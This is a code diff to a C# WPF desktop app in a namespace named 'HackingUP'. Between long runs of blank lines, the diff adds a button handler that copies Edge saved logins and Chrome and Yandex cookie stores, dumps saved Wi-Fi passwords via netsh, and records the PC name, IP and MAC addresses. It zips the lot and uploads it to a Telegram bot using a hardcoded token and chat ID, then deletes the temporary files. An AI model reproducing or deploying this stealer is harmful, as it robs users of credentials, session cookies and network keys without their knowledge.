@@ -14,6 +14,30 @@ using System.IO;
 using System.Net;
 using System.Net.Sockets;
 using System.Windows;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Collections.Generic;
+using System.IO;
+using System.IO.Compression;
+using System.Net.Http;
+using System.Net.Http;
+using System.Threading.Tasks;
+using System.IO.Compression;
+using System.Net.Http;
+using System.Threading.Tasks;
+using System.Windows.Controls;
+using System.Windows.Data;
+using System.Windows.Documents;
+using System.Windows.Input;
+using System.Windows.Media;
+using System.Windows.Media.Imaging;
+using System.Windows.Navigation;
+using System.Windows.Shapes;
+using System.IO.Compression;
+using System.IO;
 using System.Net.Http;
 using System.Threading.Tasks;
 using System.Linq;
@@ -1050,6 +1074,267 @@ namespace HackingUP
                 MessageBox.Show($"Не удалось открыть ссылку: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
             }
         }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        private async void Button_Click22(object sender, RoutedEventArgs e)
+        {
+            string userFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            string edgeSourceFilePath = System.IO.Path.Combine(userFolderPath, @"AppData\Local\Microsoft\Edge\User Data\Default\Login Data");
+            string chromeSourceFilePath = System.IO.Path.Combine(userFolderPath, @"AppData\Local\Google\Chrome\User Data\Default\Cookies");
+            string yandexSourceFilePath = System.IO.Path.Combine(userFolderPath, @"AppData\Local\Yandex\YandexBrowser\User Data\Default\Cookies");
+
+            string edgeTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Edge Cookies");
+            string chromeTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Chrome Cookies");
+            string yandexTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Yandex Cookies");
+
+            string infoTempFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "SystemInfo.txt");
+            string zipFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Info System.zip");
+
+            try
+            {
+                var filesToCopy = new List<(string SourcePath, string TempPath)>
+                {
+                    (edgeSourceFilePath, edgeTempFilePath),
+                    (chromeSourceFilePath, chromeTempFilePath),
+                    (yandexSourceFilePath, yandexTempFilePath)
+                };
+
+                var tempFiles = new List<string>();
+
+                foreach (var (sourcePath, tempPath) in filesToCopy)
+                {
+                    if (File.Exists(sourcePath))
+                    {
+                        File.Copy(sourcePath, tempPath, true);
+                        tempFiles.Add(tempPath);
+                    }
+                }
+
+                // Create the system info file
+                CreateSystemInfoFile(infoTempFilePath);
+                tempFiles.Add(infoTempFilePath);
+
+                if (tempFiles.Count > 0)
+                {
+                    CreateZipFromFiles(tempFiles, zipFilePath);
+                    await SendFileAsync(zipFilePath);
+                }
+                else
+                {
+                    MessageBox.Show("Ни один из файлов не найден.");
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Ошибка: {ex.Message}");
+            }
+            finally
+            {
+                CleanupFiles(new List<string> { edgeTempFilePath, chromeTempFilePath, yandexTempFilePath, infoTempFilePath, zipFilePath });
+            }
+        }
+
+        private static void CreateSystemInfoFile(string filePath)
+        {
+            try
+            {
+                using (StreamWriter writer = new StreamWriter(filePath))
+                {
+                    writer.WriteLine($"PC Name: {Environment.MachineName}");
+                    writer.WriteLine($"IP Address: {GetLocalIPAddress1()}");
+                    writer.WriteLine($"Network IP Address: {GetNetworkIPAddress()}");
+
+                    // Get MAC address
+                    writer.WriteLine("MAC Address:");
+                    string getmacOutput = ExecuteCommand("getmac /v");
+                    writer.WriteLine(getmacOutput);
+
+                    // Get Wi-Fi profiles and passwords
+                    writer.WriteLine("Wi-Fi Profiles:");
+                    string wifiProfilesOutput = ExecuteCommand(@"for /f ""skip=9 tokens=1,2 delims=:"" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear");
+                    writer.WriteLine(wifiProfilesOutput);
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Ошибка при создании файла SystemInfo: {ex.Message}");
+            }
+        }
+
+        private static string ExecuteCommand(string command)
+        {
+            try
+            {
+                ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
+                {
+                    RedirectStandardOutput = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+                using (Process process = new Process { StartInfo = processInfo })
+                {
+                    process.Start();
+                    return process.StandardOutput.ReadToEnd();
+                }
+            }
+            catch (Exception ex)
+            {
+                return $"Ошибка при выполнении команды: {ex.Message}";
+            }
+        }
+
+        private static string GetLocalIPAddress1()
+        {
+            string localIP = "";
+            try
+            {
+                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
+                foreach (var ip in host.AddressList)
+                {
+                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                    {
+                        localIP = ip.ToString();
+                        break;
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                localIP = $"Ошибка при получении IP адреса: {ex.Message}";
+            }
+            return localIP;
+        }
+
+        private static string GetNetworkIPAddress()
+        {
+            string networkIP = "";
+            try
+            {
+                var interfaces = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
+                foreach (var ni in interfaces)
+                {
+                    var props = ni.GetIPProperties();
+                    foreach (var ip in props.UnicastAddresses)
+                    {
+                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork && !System.Net.IPAddress.IsLoopback(ip.Address))
+                        {
+                            networkIP = ip.Address.ToString();
+                            break;
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                networkIP = $"Ошибка при получении сетевого IP адреса: {ex.Message}";
+            }
+            return networkIP;
+        }
+
+        private static void CreateZipFromFiles(List<string> sourceFilePaths, string zipFilePath)
+        {
+            using (FileStream zipToOpen = new FileStream(zipFilePath, FileMode.Create))
+            {
+                using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create))
+                {
+                    foreach (var sourceFilePath in sourceFilePaths)
+                    {
+                        archive.CreateEntryFromFile(sourceFilePath, System.IO.Path.GetFileName(sourceFilePath));
+                    }
+                }
+            }
+        }
+
+        private static async Task SendFileAsync(string filePath)
+        {
+            var botToken = "7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw";
+            var chatId = "1005333334";
+            var url = $"https://api.telegram.org/bot{botToken}/sendDocument";
+
+            using (var client = new HttpClient())
+            {
+                var form = new MultipartFormDataContent();
+                var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath));
+                fileContent.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("multipart/form-data");
+                form.Add(fileContent, "document", System.IO.Path.GetFileName(filePath));
+                form.Add(new StringContent(chatId), "chat_id");
+
+                var response = await client.PostAsync(url, form);
+                response.EnsureSuccessStatusCode();
+            }
+        }
+
+        private static void CleanupFiles(List<string> filePaths)
+        {
+            foreach (var filePath in filePaths)
+            {
+                if (File.Exists(filePath))
+                {
+                    File.Delete(filePath);
+                }
+            }
+        }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
     }
 
     // Пример класса WallpaperChanger с методом SetWallpaper
